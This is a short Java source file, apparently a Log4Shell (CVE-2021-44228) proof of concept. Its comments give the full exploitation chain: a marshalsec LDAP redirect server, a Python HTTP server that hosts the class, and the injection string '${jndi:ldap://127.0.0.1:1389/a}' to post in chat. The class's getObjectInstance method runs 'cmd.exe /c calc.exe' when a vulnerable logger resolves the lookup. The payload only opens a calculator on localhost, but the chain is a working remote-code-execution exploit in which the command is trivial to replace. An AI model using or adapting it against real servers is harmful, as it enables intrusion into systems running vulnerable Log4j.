import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

// java 8u172 or below
// `java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#CalcExploit"` to serve jndi redirect
// (see https://github.com/mbechler/marshalsec)
// can serve this exploit w/ something like `python -m http.server 8888` in the directory w/ the class file
// ${jndi:ldap://127.0.0.1:1389/a} in chat to win

// https://github.com/mbechler/marshalsec
// https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
// https://www.cyberkendra.com/2021/12/worst-log4j-rce-zeroday-dropped-on.html
// https://github.com/tangxiaofeng7/apache-log4j-poc
// https://www.lunasec.io/docs/blog/log4j-zero-day/
// https://github.com/apache/logging-log4j2/pull/608/files
// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
// https://www.cnblogs.com/yyhuni/p/15088134.html

public class CalcExploit implements javax.naming.spi.ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        ProcessBuilder builder = new ProcessBuilder();
        builder.command("cmd.exe", "/c", "calc.exe");
        builder.start();
        return null;
    }
}
